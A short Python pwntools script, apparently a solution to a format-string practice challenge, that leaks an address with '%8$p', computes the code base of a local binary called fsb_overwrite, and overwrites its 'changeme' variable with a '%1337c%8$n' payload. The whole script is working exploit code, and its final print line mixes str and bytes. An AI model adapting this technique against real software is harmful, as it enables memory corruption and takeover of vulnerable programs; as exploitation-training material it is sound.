from pwn import *

def slog(n, m): return success(": ".join([n, hex(m)]))

p = process("./fsb_overwrite")
elf = ELF("./fsb_overwrite")
context.arch = "amd64"

# [1] Get Address of changeme
p.sendline("%8$p") # FSB

leaked = int(p.recvline()[:-1], 16)
slog("leak", leaked)

code_base = leaked - elf.symbols["__libc_csu_init"]
slog("init_symbols", elf.symbols["__libc_csu_init"])
slog("code_base", code_base)

changeme = code_base + elf.symbols["changeme"]
slog("changeme_symbols", elf.symbols["changeme"])
slog("changeme", changeme)


# [2] Overwrite changeme
payload = "%1337c"
payload +="%8$n"
payload += "AAAAAA"
payload = payload.encode() + p64(changeme)
print("payload : "+payload)

p.sendline(payload)

p.interactive()
